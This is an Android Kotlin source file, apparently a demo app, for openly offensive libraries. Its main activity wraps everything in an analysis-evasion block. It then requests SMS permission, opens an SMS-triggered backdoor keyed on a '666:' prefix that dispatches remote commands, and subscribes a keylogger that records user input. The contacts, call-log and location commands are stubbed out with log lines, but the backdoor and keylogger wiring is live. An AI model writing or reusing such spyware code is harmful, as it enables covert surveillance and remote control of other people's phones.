package com.evilthreads.evademe

import android.Manifest
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.evilthreads.evade.evade
import com.evilthreads.keylogger.Keylogger
import com.evilthreads.smsbackdoor.SmsBackdoor
import com.kotlinpermissions.KotlinPermissions

/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
class MainActivity : AppCompatActivity() {
    val TAG = this.javaClass.simpleName
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        evade {
            KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS).onAccepted {
                SmsBackdoor.openDoor(this, "666:", payload = {
                    Keylogger.subscribe { entry ->
                        Log.d("KEYLOGGER", entry.toString())
                    }
                }){ remoteCommand ->
                    when(remoteCommand){
                        "COMMAND_GET_CONTACTS" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THESE CONTACTS")
                        "COMMAND_GET_CALL_LOG" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE CALL LOG")
                        "COMMAND_GET_LOCATION" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE GPS LOCATION")
                        else -> Log.d(TAG, "COMMAND NOT FOUND")
                    }
                }
                Keylogger.requestPermission(this)
            }.ask()
        }
    }
}